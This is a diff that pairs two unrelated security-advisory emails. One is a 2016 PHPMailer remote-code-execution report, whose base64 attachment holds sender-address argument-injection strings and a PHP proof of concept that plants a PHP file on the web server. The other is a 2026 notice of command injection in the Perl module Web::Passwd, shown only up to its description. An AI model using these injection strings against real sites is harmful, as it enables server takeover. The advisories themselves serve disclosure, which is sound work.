@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["14584" "Tuesday" "27" "December" "2016" "09:45:48" "-0200" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzsun=xdfigzGDDjwJf8TKZ73jb8L+jnntP3yQoZRZ--SWA@mail.gmail.com>" "255" "[oss-security] PHPMailer < 5.2.18 Remote Code Execution [updated advisory] [CVE-2016-10033]" nil nil nil "12" "2016122711:45:48" "[oss-security] PHPMailer < 5.2.18 Remote Code Execution [updated advisory] [CVE-2016-10033]" (number mark "U       dawid@legalh Dec 27  255/14584 " thread-indent "\"[oss-security] PHPMailer < 5.2.18 Remote Code Execution [updated advisory] [CVE-2016-10033]\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 27761 invoked by uid 550); 27 Dec 2016 14:09:16 -0000
+Received: (qmail 22244 invoked by uid 550); 13 May 2026 22:38:09 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,290 +7,77 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26310 invoked from network); 27 Dec 2016 11:46:00 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=gURosUb5LiW46co3KwsIDgYq3zpN8gmxRxfo+l9G2/U=;
-        b=nNwu3n7qP2s60J0vOeVRDwD9lkLmXB70sLZuRhwj0Yyv1kyh5UrEBScDuKkbMWbEn+
-         x1lvFL1eMZRkgC9ENqp139KbZulhA6lOCd08n7z8RapY5SXym6Vn39FWZ3CzoTLmFbuw
-         0j5vNxujml35G1gDXJWS74hB9oxyJ0cWlBLbuEhEijCNZrAakQoDP3X3BXYHR8UWhXLa
-         fBKHGOM6gWIOhyvj01t88PufqtrvkEuPBNEhhL8eedH97XhGZsn4QdoBRZkZ/WhubEFc
-         N1951GoZ1T/Ms6nz/o2LAFSzCw4ZZ0GU9s9Xq5+8bnZ4X3LrqDb4AeP/xiy+aEpB5f1/
-         N8Ew==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=gURosUb5LiW46co3KwsIDgYq3zpN8gmxRxfo+l9G2/U=;
-        b=L0O61SgOspgW8kF0+S0uzGakOJDk0AO3yfk7f7EyBokZdMw/1XIrsRe/yZPO38iegp
-         FbxKzgPywkOaQnKBdZstzA8irHBJj/3e6Q/IyYFBEiHqK/I4/TI4Dr7f9TiUvzSswDeS
-         /2AzEIcBkXGDMGNRvFR4cpqN7pKri7c9s3ZW7E2K5wVk9W/DgkHF2D/dIHx4MbwIhJVd
-         I69lg5MvEV64trb0BPUGYxHzNrhAfPwqA0fprKhcymWYVr+pGCTdXn7TF2W2T/yklgB2
-         +npRGZro2wgUZqCvMiNrjDV+U4C3eQkPST+iZdSs9QeqwqEVD+ePqGr35wsqBNgkd52Y
-         nysg==
-X-Gm-Message-State: AIkVDXI/QuJ/NW5RI2c456Svu38m0M4LoYZ+CeQesD1ci2HLUuw2ae3TlaCrxMDUQyA3V/5EsYP//koaxoCPIA==
-X-Received: by 10.176.7.134 with SMTP id c6mr4825014uaf.172.1482839148603;
- Tue, 27 Dec 2016 03:45:48 -0800 (PST)
+x-ms-reactions: disallow
+Received: (qmail 19615 invoked from network); 13 May 2026 22:26:12 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=cpansec.org; s=gm1;
+	t=1778711163;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=hu0GvRtBiKogN2IsfQwZtuV8X1mVLI8OUp0+GENWxqY=;
+	b=pSa55GTO6VAd2mj67JZGTPYJQrHTnpm4B7vH8XyP+zjpar2wMblGmR/5ZsDRZCam2VsYMN
+	G8gsqmXxG8vdaVhGqZ43W1xcyxZdf/uCreLdFjm6OTZPSBjAxvnSGXe7iHmjNYFywQSXiR
+	9dqujy6ED8Ljac7ie8Kr7cjSN34ovCVIAFJO04nXXohqNLsO93rRO0MKALZdYDOobVhw1u
+	o7M1ZzYyDjxOhFwJoCFo7PZyfddBcGb4bzwWo5C0oKzXsVQA8wzOFKlzHTNAfMmccDeNuc
+	DBbGUQLbnoOxa758uLIjJn3n7V+dyRWUWjL8B/dsbq6bcmsKEe+AE2Nq9CozPA==
+Message-ID: <cdc064f9-a872-42de-8f20-7a3117a99a3c@cpansec.org>
+Date: Wed, 13 May 2026 23:26:02 +0100
 MIME-Version: 1.0
-From: Dawid Golunski <dawid@legalhackers.com>
-Date: Tue, 27 Dec 2016 09:45:48 -0200
-Message-ID: <CADSYzsun=xdfigzGDDjwJf8TKZ73jb8L+jnntP3yQoZRZ--SWA@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/mixed; boundary=f403045f813ab6526f0544a2649d
-Subject: [oss-security] PHPMailer < 5.2.18 Remote Code Execution [updated advisory] [CVE-2016-10033]
+User-Agent: Mozilla Thunderbird
+From: Robert Rothenberg <rrwo@cpansec.org>
+Content-Language: en-GB, en-ZA
+To: cve-announce@security.metacpan.org, oss-security@lists.openwall.com
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+X-GND-Sasl: rrwo@cpansec.org
+X-GND-Cause: dmFkZTGqoZTB6d47RLOVzT8A+WMneBFMg7rVjm6HX+yTIGn1JbXTWFLFPP/gZLL82gGcpSbrgj0b4fLsemQIZhIU3hViKELm1StS2BG2Bcysoz5ztG0SMfyjsXWY4zXwiahMbVw3Pn6t7eMf32INBqiwoRHTYpxbEfGv7B89pklGVakk3JmdPpVhgx29Bvhue1m+N2UGd0TwxwxffaJ2wtrjacSdXSDbcvKR5R6HPQx6dspZ4mzdaMsa3IF7nBx+Z3yFyakTrdK8Mote+P/jZzHJjFpFrnsf5ToaBR9odmZCzDInLntgUGfALGhcSEQ73du9t2qbpUs9eJaen1Fg79Qi+uSsKXPWPAav7U4bzTkj3jWZ8zQCGaELdA+POBzL9EsJcKrJEjitqL6WsN8SPsLrS7OVralSSJ0fFzZsj+j/FHp4wbnJeUR/GbjwvZ0YnptXuNz1gnftKgQJPahU3g8zOb8viG6wEBQ/E/Wps64SJxVqZ0P6plpP2/xheWJdIFIE9WavrpZoiFJPq9GW0EL+7sA5TdbMhcrRezh7JJ1E8LYdh0TW3pItHKB045mYmG2wE826Hs+y3iQSdcf7evasJ/OycarWoCqy1Hj7FqbBpPqP7wry9gmVUKFW4k1kKzP7WXraZw63VVmAn1XJlpcn94e+9nL43DhA9Huqk315kGg3JQ
+X-GND-State: clean
+X-GND-Score: 0
+Subject: [oss-security] CVE-2026-8500: Web::Passwd versions through 0.03 for Perl is
+ vulnerable to RCE
 
---f403045f813ab6526f0544a2649d
-Content-Type: text/plain; charset=UTF-8
+========================================================================
+CVE-2026-8500                                        CPAN Security Group
+========================================================================
 
-PHPMailer < 5.2.18 Remote Code Execution
-CVE-2016-10033
+         CVE ID:  CVE-2026-8500
+   Distribution:  Web-Passwd
+       Versions:  through 0.03
 
-Attaching an updated version of the advisory with more details + simple PoC.
+       MetaCPAN:  https://metacpan.org/dist/Web-Passwd
 
-Still incomplete. There will be more updates/exploits soon at:
 
-https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
+Web::Passwd versions through 0.03 for Perl is vulnerable to RCE
 
-https://twitter.com/dawid_golunski
+Description
+-----------
+Web::Passwd versions through 0.03 for Perl is vulnerable to RCE.
 
--- 
-Regards,
-Dawid Golunski
-https://legalhackers.com
-t: @dawid_golunski
+Web::Passwd is a small CGI application for managing htpasswd files
+using the htpasswd command.
 
---f403045f813ab6526f0544a2649d
-Content-Type: text/plain; charset=US-ASCII; name="PHPMailer-Exploit.txt"
-Content-Disposition: attachment; filename="PHPMailer-Exploit.txt"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_ix7frhoa0
+The user parameter is not validated or escaped, and is used as the last
+argument on the command line, allowing for command injection.
 
-CgogICAgX18gICAgICAgICAgICAgICAgICAgICBfXyAgIF9fICBfXyAgICAg
-ICAgICAgX18gICAgICAgICAgICAgICAgIAogICAvIC8gICBfX18gIF9fX18g
-X19fX18gXy8gLyAgLyAvIC8gL19fXyBfX19fX18vIC9fX19fXyAgX19fX19f
-X19fXwogIC8gLyAgIC8gXyBcLyBfXyBgLyBfXyBgLyAvICAvIC9fLyAvIF9f
-IGAvIF9fXy8gLy9fLyBfIFwvIF9fXy8gX19fLwogLyAvX19fLyAgX18vIC9f
-LyAvIC9fLyAvIC8gIC8gX18gIC8gL18vIC8gL19fLyAsPCAvICBfXy8gLyAg
-KF9fICApIAovX19fX18vXF9fXy9cX18sIC9cX18sXy9fLyAgL18vIC9fL1xf
-XyxfL1xfX18vXy98X3xcX19fL18vICAvX19fXy8gIAogICAgICAgICAgIC9f
-X19fLyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgICAgIAoKCgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT0KLSBEaXNjb3ZlcmVkIGJ5OiBEYXdpZCBHb2x1bnNr
-aQotIGRhd2lkW2F0XWxlZ2FsaGFja2Vycy5jb20KLSBodHRwczovL2xlZ2Fs
-aGFja2Vycy5jb20KCi0gQ1ZFLTIwMTYtMTAwMzMKLSBSZWxlYXNlIGRhdGU6
-IDI1LjEyLjIwMTYKLSBMYXN0IHJldmlzaW9uOiAyNy4xMi4yMDE2Ci0gUmV2
-aXNpb24gMi4wCi0gU2V2ZXJpdHk6IENyaXRpY2FsCj09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKCkkuIFZVTE5FUkFC
-SUxJVFkKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKUEhQTWFpbGVyIDwg
-NS4yLjE4IFJlbW90ZSBDb2RlIEV4ZWN1dGlvbgoKCklJLiBCQUNLR1JPVU5E
-Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiJQSFBNYWlsZXIgY29udGlu
-dWVzIHRvIGJlIHRoZSB3b3JsZCdzIG1vc3QgcG9wdWxhciB0cmFuc3BvcnQg
-Y2xhc3MsIHdpdGggYW4KZXN0aW1hdGVkIDkgbWlsbGlvbiB1c2VycyB3b3Js
-ZHdpZGUuIERvd25sb2FkcyBjb250aW51ZSBhdCBhIHNpZ25pZmljYW50CnBh
-Y2UgZGFpbHkuIgoKaHR0cDovL3BocG1haWxlci53b3J4d2FyZS5jb20vCgoK
-IlByb2JhYmx5IHRoZSB3b3JsZCdzIG1vc3QgcG9wdWxhciBjb2RlIGZvciBz
-ZW5kaW5nIGVtYWlsIGZyb20gUEhQIQpVc2VkIGJ5IG1hbnkgb3Blbi1zb3Vy
-Y2UgcHJvamVjdHM6IFdvcmRQcmVzcywgRHJ1cGFsLCAxQ1JNLCBTdWdhckNS
-TSwgWWlpLApKb29tbGEhIGFuZCBtYW55IG1vcmUiCgpodHRwczovL2dpdGh1
-Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlcgoKCklJSS4gSU5UUk9EVUNUSU9O
-Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCkFuIGluZGVwZW5kZW50IHJl
-c2VhcmNoIHVuY292ZXJlZCBhIGNyaXRpY2FsIHZ1bG5lcmFiaWxpdHkgaW4g
-UEhQTWFpbGVyIHRoYXQgCmNvdWxkIHBvdGVudGlhbGx5IGJlIHVzZWQgYnkg
-KHVuYXV0aGVudGljYXRlZCkgcmVtb3RlIGF0dGFja2VycyB0byBhY2hpZXZl
-IApyZW1vdGUgYXJiaXRyYXJ5IGNvZGUgZXhlY3V0aW9uIGluIHRoZSBjb250
-ZXh0IG9mIHRoZSB3ZWIgc2VydmVyIHVzZXIgYW5kIApyZW1vdGVseSBjb21w
-cm9taXNlIHRoZSB0YXJnZXQgd2ViIGFwcGxpY2F0aW9uLgoKVG8gZXhwbG9p
-dCB0aGUgdnVsbmVyYWJpbGl0eSBhbiBhdHRhY2tlciBjb3VsZCB0YXJnZXQg
-Y29tbW9uIHdlYnNpdGUKY29tcG9uZW50cyBzdWNoIGFzIGNvbnRhY3QvZmVl
-ZGJhY2sgZm9ybXMsIHJlZ2lzdHJhdGlvbiBmb3JtcywgcGFzc3dvcmQKZW1h
-aWwgcmVzZXRzIGFuZCBvdGhlcnMgdGhhdCBzZW5kIG91dCBlbWFpbHMgd2l0
-aCB0aGUgaGVscCBvZiBhIHZ1bG5lcmFibGUKdmVyc2lvbiBvZiB0aGUgUEhQ
-TWFpbGVyIGNsYXNzLgoKTm90ZTogVGhpcyByZXZpc2lvbiAoMi4wKSBvZiB0
-aGUgYWR2aXNvcnksIGNvbnRhaW5zIG1vcmUgaW5mb3JtYXRpb24gYnV0Cmlz
-IHN0aWxsIGluY29tcGxldGUuIApSZW1haW5pbmcgYXR0YWNrIHZlY3RvcnMv
-ZXhwbG9pdHMgd2lsbCBiZSBkaXNjbG9zZWQgYXQgYSBsYXRlciBkYXRlIHRv
-IGFsbG93Cm1vcmUgdGltZSBmb3IgcGF0Y2hpbmcuCgpJVi4gREVTQ1JJUFRJ
-T04KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKClBIUE1haWxlciBjbGFz
-cyB1c2VzIFBIUCBtYWlsKCkgZnVuY3Rpb24gYXMgaXRzIGRlZmF1bHQgdHJh
-bnNwb3J0LgoKVGhlIHRyYW5zcG9ydCBpcyBpbXBsZW1lbnRlZCB1c2luZyB0
-aGUgZnVuY3Rpb246CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIG1haWxTZW5k
-KCRoZWFkZXIsICRib2R5KQogICAgewogICAgICAgICR0b0FyciA9IGFycmF5
-KCk7CiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0b2FkZHIpIHsK
-ICAgICAgICAgICAgJHRvQXJyW10gPSAkdGhpcy0+YWRkckZvcm1hdCgkdG9h
-ZGRyKTsKICAgICAgICB9CiAgICAgICAgJHRvID0gaW1wbG9kZSgnLCAnLCAk
-dG9BcnIpOwoKICAgICAgICAkcGFyYW1zID0gbnVsbDsKICAgICAgICAvL1Ro
-aXMgc2V0cyB0aGUgU01UUCBlbnZlbG9wZSBzZW5kZXIgd2hpY2ggZ2V0cyB0
-dXJuZWQgaW50byBhIHJldHVybi1wYXRoIGhlYWRlciBieSB0aGUgcmVjZWl2
-ZXIKICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpKSB7CiAgICAg
-ICAgICAgICRwYXJhbXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRl
-cik7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+U2VuZGVyICE9ICcn
-IGFuZCAhaW5pX2dldCgnc2FmZV9tb2RlJykpIHsKICAgICAgICAgICAgJG9s
-ZF9mcm9tID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgICAg
-ICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7CiAg
-ICAgICAgfQogICAgICAgICRyZXN1bHQgPSBmYWxzZTsKICAgICAgICBpZiAo
-JHRoaXMtPlNpbmdsZVRvIGFuZCBjb3VudCgkdG9BcnIpID4gMSkgewogICAg
-ICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgewogICAgICAg
-ICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvQWRk
-ciwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsK
-Cgp3aGljaCBlc3NlbnRpYWxseSBwYXNzZXMgdGhlIGFyZ3VtZW50cyBzaG93
-biBpbiB0aGUgbGluZToKCiRyZXN1bHQgPSAkdGhpcy0+bWFpbFBhc3N0aHJ1
-KCR0b0FkZHIsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJGhlYWRlciwgJHBh
-cmFtcyk7Cgp0byB0aGUgbWFpbCgpIGZ1bmN0aW9uIHdpdGggdGhlIHNhbWUg
-c2V0IG9mIHBhcmFtZXRlcnMuCgoKVGhlIHBhcmFtZXRlcnMgaW5jbHVkZSB0
-aGUgNXRoIHBhcmFtZXRlciBvZiAkcGFyYW1zIHdoaWNoIGFsbG93cyB0byBw
-YXNzIGV4dHJhCnBhcmFtZXRlcnMgdG8gc2VuZG1haWwgYmluYXJ5IGluc3Rh
-bGxlZCBvbiB0aGUgc3lzdGVtIGFzIHBlciBQSFAgZG9jdW1lbnRhdGlvbgpv
-ZiBtYWlsKCkgZnVuY3Rpb246CgpodHRwOi8vcGhwLm5ldC9tYW51YWwvZW4v
-ZnVuY3Rpb24ubWFpbC5waHAKCkFzIGNhbiB3ZSBzZWUgZnJvbToKCiRwYXJh
-bXMgPSBzcHJpbnRmKCctZiVzJywgJHRoaXMtPlNlbmRlcik7CgoKUEhQTWFp
-bGVyIHVzZXMgdGhlIFNlbmRlciB2YXJpYWJsZSB0byBidWlsZCB0aGUgcGFy
-YW1zIHN0cmluZy4KCgpUaGUgU2VuZGVyIHN0cmluZyBpcyBub3JtYWxseSBz
-ZXQgd2l0aCB0aGUgdXNlIG9mIHNldEZyb20oKSBtZXRob2QuCndoaWNoIHZh
-bGlkYXRlcyB0aGUgU2VuZGVyJ3MgYWRkcmVzczoKCnB1YmxpYyBmdW5jdGlv
-biBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUp
-CnsKJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsKJG5hbWUgPSB0cmltKHBy
-ZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRuYW1lKSk7IC8vU3RyaXAg
-YnJlYWtzIGFuZCB0cmltCi8vIERvbid0IHZhbGlkYXRlIG5vdyBhZGRyZXNz
-ZXMgd2l0aCBJRE4uIFdpbGwgYmUgZG9uZSBpbiBzZW5kKCkuCmlmICgoJHBv
-cyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSBvcgogICAg
-KCEkdGhpcy0+aGFzOGJpdENoYXJzKHN1YnN0cigkYWRkcmVzcywgKyskcG9z
-KSkgb3IgISR0aGlzLT5pZG5TdXBwb3J0ZWQoKSkgYW5kCiAgICAhJHRoaXMt
-PnZhbGlkYXRlQWRkcmVzcygkYWRkcmVzcykpIHsKLi4uCgoKVGhlIHZhbGlk
-YXRpb24gd291bGQgZm9yIGV4YW1wbGUgcmVqZWN0IGFuIGFkZHJlc3MgYXM6
-CgphdHRhY2tlciAtSW5qZWN0ZWRQYXJhbTIgQGF0dGFja2VyLmNvbQoKd2hp
-Y2ggd291bGQgcHJldmVudCBpbmplY3Rpb24gb2YgYWRkaXRpb25hbCBwYXJh
-bWV0ZXJzIHRvIFNlbmRtYWlsIHZpYSB0aGUKbWFpbCgpIGZ1bmN0aW9uLgoK
-CkZ1cnRoZXIgcmVzZWFyY2ggaG93ZXZlciBzaG93biB0aGF0IHRoZSB2YWxp
-ZGF0aW9uIGlzIGRvbmUgdXNpbmcgdGhlIFJGQyAzNjk2IHNwZWNpZmljYXRp
-b24uCgpUaGUgUkZDIGFsbG93cyBlbWFpbHMgdG8gY29udGFpbiBzcGFjZXMg
-d2hlbiBxdW90ZWQgd2l0aCAiLiAKQWNjb3JkaW5nIHRvIHRoZSBzcGVjLCB0
-aGUgZm9sbG93aW5nIGVtYWlsIGFkZHJlc3MgaXMgdmFsaWQ6CgoiIHNvbWUg
-dGVzdCBlbWFpbCBhZGRyZXNzIHdpdGggc3BhY2VzIkB3ZWlyZC1lbWFpbC5j
-b20KCgpUaGUgZm9sbG93aW5nIFNlbmRlciBhZGRyZXNzOgoKIkF0dGFja2Vy
-IC1QYXJhbTIgLVBhcmFtMyJAdGVzdC5jb20KCndvdWxkIGNhdXNlIFBIUE1h
-aWxlci9tYWlsKCkgZnVuY3Rpb24gdG8gZXhlY3V0ZSAvdXNyL2Jpbi9zZW5k
-bWFpbCB3aXRoIHRoZQpmb2xsb3dpbmcgbGlzdCBvZiBhcmd1bWVudHM6CgpB
-cmcgbm8uIDAgPT0gWy91c3Ivc2Jpbi9zZW5kbWFpbF0KQXJnIG5vLiAxID09
-IFstdF0KQXJnIG5vLiAyID09IFstaV0KQXJnIG5vLiAzID09IFstZkF0dGFj
-a2VyIC1QYXJhbTIgLVBhcmFtM0B0ZXN0LmNvbV0KCndoaWNoIHdvdWxkIG5v
-dCB3b3JrIGZvciB0aGUgYXR0YWNrZXIgKFBhcmFtMiBhbmQgUGFyYW0zIGFy
-ZSBwYXNzZWQgd2l0aGluCnRoZSBzYW1lIGFyZ3VtZW50IG9mIGFyZ3ZbM10g
-KQoKCkF0dGFja2VycyBjYW4gaG93ZXZlciBicmVhayBvdXQgb2YgcGFyYW1l
-dGVyIG5vLjMgd2l0aCBzb21lIGV4dHJhIGVzY2FwaW5nLgoKRm9yIGV4YW1w
-bGUsIGJ5IGluamVjdGluZyBhbiBleHRyYSBzZXF1ZW5jZSBvZiBcIiBhZnRl
-ciB0aGUgZmlyc3QgYXJndW1lbnQsCnRoZSBmb2xsb3dpbmcgU2VuZGVyIGVt
-YWlsOgoKIkF0dGFja2VyIFwiIC1QYXJhbTIgLVBhcmFtMyJAdGVzdC5jb20K
-CndoZW4gcGFzc2VkIHRvIFBIUE1haWxlciAoYW5kIGV2ZW50dWFsbHkgdG8g
-bWFpbCgpKSBmdW5jdGlvbiB3b3VsZCBjYXVzZQpzZW5kbWFpbCB0byBleGVj
-dXRlIHdpdGg6CgpBcmcgbm8uIDAgPT0gWy91c3Ivc2Jpbi9zZW5kbWFpbF0K
-QXJnIG5vLiAxID09IFstdF0KQXJnIG5vLiAyID09IFstaV0KQXJnIG5vLiAz
-ID09IFstZkF0dGFja2VyXF0KQXJnIG5vLiA0ID09IFstUGFyYW0yXQpBcmcg
-bm8uIDUgPT0gWy1QYXJhbTMiQHRlc3QuY29tXQoKCldoaWNoIGFzIGNhbiBi
-ZSBzZWVuIHdvdWxkIGluamVjdCBhZGRpdGlvbmFsIHBhcmFtZXRlcnMgb2Yg
-NCAmIDUgdG8gc2VuZG1haWwuCgoKQXR0YWNrZXJzIGNhbiBleHBsb2l0IHRo
-aXMgdG8gYWNoaWV2ZSBjb2RlIGV4ZWN1dGlvbiBhcyBzaG93biBpbiB0aGUg
-UG9DCmJlbG93LgoKCgpWLiBQUk9PRiBPRiBDT05DRVBUIEVYUExPSVQKLS0t
-LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKPD9waHAKCi8qCgpQSFBNYWlsZXIg
-PCA1LjIuMTggUmVtb3RlIENvZGUgRXhlY3V0aW9uIChDVkUtMjAxNi0xMDAz
-MykKCkRpc2NvdmVyZWQvQ29kZWQgYnk6CgpEYXdpZCBHb2x1bnNraSAoQGRh
-d2lkX2dvbHVuc2tpKQpodHRwczovL2xlZ2FsaGFja2Vycy5jb20KCkZ1bGwg
-QWR2aXNvcnkgVVJMOgpodHRwczovL2xlZ2FsaGFja2Vycy5jb20vYWR2aXNv
-cmllcy9QSFBNYWlsZXItRXhwbG9pdC1SZW1vdGUtQ29kZS1FeGVjLUNWRS0y
-MDE2LTEwMDMzLVZ1bG4uaHRtbAoKCkEgc2ltcGxlIFBvQyAod29ya2luZyBv
-biBTZW5kbWFpbCBNVEEpCgpJdCB3aWxsIGluamVjdCB0aGUgZm9sbG93aW5n
-IHBhcmFtZXRlcnMgdG8gc2VuZG1haWwgY29tbWFuZDoKCkFyZyBuby4gMCA9
-PSBbL3Vzci9zYmluL3NlbmRtYWlsXQpBcmcgbm8uIDEgPT0gWy10XQpBcmcg
-bm8uIDIgPT0gWy1pXQpBcmcgbm8uIDMgPT0gWy1mYXR0YWNrZXJcXQpBcmcg
-bm8uIDQgPT0gWy1vUS90bXAvXQpBcmcgbm8uIDUgPT0gWy1YL3Zhci93d3cv
-Y2FjaGUvcGhwY29kZS5waHBdCkFyZyBuby4gNiA9PSBbc29tZSJAZW1haWwu
-Y29tXQoKCndoaWNoIHdpbGwgd3JpdGUgdGhlIHRyYW5zZmVyIGxvZyAoLVgp
-IGludG8gL3Zhci93d3cvY2FjaGUvcGhwY29kZS5waHAgZmlsZS4KVGhlIHJl
-c3VsdGluZyBmaWxlIHdpbGwgY29udGFpbiB0aGUgcGF5bG9hZCBwYXNzZWQg
-aW4gdGhlIGJvZHkgb2YgdGhlIG1zZzoKCjA5NjA3IDw8PCAtLWIxX2NiNDU2
-NmFhNTFiZTlmMDkwZDk0MTkxNjNlNDkyMzA2CjA5NjA3IDw8PCBDb250ZW50
-LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11cy1hc2NpaQowOTYwNyA8PDwg
-CjA5NjA3IDw8PCA8P3BocCBwaHBpbmZvKCk7ID8+CjA5NjA3IDw8PCAKMDk2
-MDcgPDw8IAowOTYwNyA8PDwgCjA5NjA3IDw8PCAtLWIxX2NiNDU2NmFhNTFi
-ZTlmMDkwZDk0MTkxNjNlNDkyMzA2LS0KCgpTZWUgdGhlIGZ1bGwgYWR2aXNv
-cnkgVVJMIGZvciBkZXRhaWxzLgoKKi8KCgovLyBBdHRhY2tlcidzIGlucHV0
-IGNvbWluZyBmcm9tIHVudHJ1c3RlZCBzb3VyY2Ugc3VjaCBhcyAkX0dFVCAs
-ICRfUE9TVCBldGMuCi8vIEZvciBleGFtcGxlIGZyb20gYSBDb250YWN0IGZv
-cm0KCiRlbWFpbF9mcm9tID0gJyJhdHRhY2tlclwiIC1vUS90bXAvIC1YL3Zh
-ci93d3cvY2FjaGUvcGhwY29kZS5waHAgIHNvbWUiQGVtYWlsLmNvbSc7CiRt
-c2dfYm9keSAgPSAiPD9waHAgcGhwaW5mbygpOyA/PiI7CgovLyAtLS0tLS0t
-LS0tLS0tLS0tLS0KCgovLyBtYWlsKCkgcGFyYW0gaW5qZWN0aW9uIHZpYSB0
-aGUgdnVsbmVyYWJpbGl0eSBpbiBQSFBNYWlsZXIKCnJlcXVpcmVfb25jZSgn
-Y2xhc3MucGhwbWFpbGVyLnBocCcpOwokbWFpbCA9IG5ldyBQSFBNYWlsZXIo
-KTsgLy8gZGVmYXVsdHMgdG8gdXNpbmcgcGhwICJtYWlsKCkiCgokbWFpbC0+
-U2V0RnJvbSgkZW1haWxfZnJvbSwgJ0NsaWVudCBOYW1lJyk7CgokYWRkcmVz
-cyA9ICJjdXN0b21lcl9mZWVkYmFja0Bjb21wYW55LVguY29tIjsKJG1haWwt
-PkFkZEFkZHJlc3MoJGFkZHJlc3MsICJTb21lIFVzZXIiKTsKCiRtYWlsLT5T
-dWJqZWN0ICAgID0gIlBIUE1haWxlciBQb0MgRXhwbG9pdCBDVkUtMjAxNi0x
-MDAzMyI7CiRtYWlsLT5Nc2dIVE1MKCRtc2dfYm9keSk7CgppZighJG1haWwt
-PlNlbmQoKSkgewogIGVjaG8gIk1haWxlciBFcnJvcjogIiAuICRtYWlsLT5F
-cnJvckluZm87Cn0gZWxzZSB7CiAgZWNobyAiTWVzc2FnZSBzZW50IVxuIjsK
-fQogICAgCgoKCgp+fn5+fn5+fn5+fgoKVGhlIHJlc2VhcmNoZXIgYWxzbyBk
-ZXZlbG9wZWQgYW4gVW5hdXRoZW50aWNhdGVkIFJDRSBleHBsb2l0IGZvciBh
-IHBvcHVsYXIgCm9wZW4tc291cmNlIGFwcGxpY2F0aW9uIChkZXBsb3llZCBv
-biB0aGUgSW50ZXJuZXQgb24gbW9yZSB0aGFuIGEgbWlsbGlvbiBzZXJ2ZXJz
-KQphcyBhIFBvQyBmb3IgcmVhbC13b3JsZCBleHBsb2l0YXRpb24uIEl0IG1p
-Z2h0IGJlIHB1Ymxpc2hlZCBhZnRlciB0aGUgdmVuZG9yIGhhcyAKZml4ZWQg
-dGhlIHZ1bG5lcmFiaWxpdGllcy4KClZpZGVvIFBvQzoKfn5+fn5+fn5+fn5+
-fgoKaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL3ZpZGVvcy9QSFBNYWlsZXIt
-RXhwbG9pdC1SZW1vdGUtQ29kZS1FeGVjLVZ1bG4tQ1ZFLTIwMTYtMTAwMzMt
-UG9DLmh0bWwKCgpWSS4gQlVTSU5FU1MgSU1QQUNUCi0tLS0tLS0tLS0tLS0t
-LS0tLS0tLS0tLS0KCkEgc3VjY2Vzc2Z1bCBleHBsb2l0YXRpb24gY291bGQg
-bGV0IHJlbW90ZSBhdHRhY2tlcnMgdG8gZ2FpbiBhY2Nlc3MgdG8gCnRoZSB0
-YXJnZXQgc2VydmVyIGluIHRoZSBjb250ZXh0IG9mIHRoZSB3ZWIgc2VydmVy
-IGFjY291bnQgd2hpY2ggY291bGQKbGVhZCB0byBhIGZ1bGwgY29tcHJvbWlz
